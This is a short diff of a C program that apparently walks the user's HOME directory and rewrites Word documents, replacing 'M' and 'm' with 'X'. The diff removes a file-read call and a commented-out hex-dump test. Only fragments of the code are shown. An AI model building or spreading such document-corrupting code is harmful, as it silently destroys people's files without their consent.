@@ -15,7 +15,6 @@
 Open the .docx or .doc file and replace 'M' and 'm' with 'X'
 **********************************************************************************/
 void convertXtoM(char *filepath){
-	//int c;
 	FILE *file;
 	char *buffer;
 	unsigned long fileLen;
@@ -38,29 +37,6 @@ void convertXtoM(char *filepath){
       fclose(file);
 		return;
 	}
-
-	// Read file contents into the buffer
-	fread(buffer, fileLen, 1, file);
-	fclose(file);
-
-	/* For testing purposes */
-	// Print out the first 1000 bytes of data in Hex
-	/*for (c=0;c<1000;c++)
-	{
-		printf("%.2X ", (int)buffer[c]);
-
-		// Put an extra space between every 4 bytes
-		if (c % 4 == 3)
-		{
-			printf(" ");
-		}
-
-		// Display 16 bytes per line
-		if (c % 16 == 15)
-		{
-			printf("\n");
-		}
-	}*/
 
 	free(buffer);
 
@@ -113,7 +89,7 @@ void spiderDirectory(char *homeDir, DIR *d){
 /*********************************************************************************
 Main Function
 **********************************************************************************/
-void* MtoX(void* param) {
+void MtoX() {
 	DIR *d;
 	char *homedir = getenv("HOME");
 
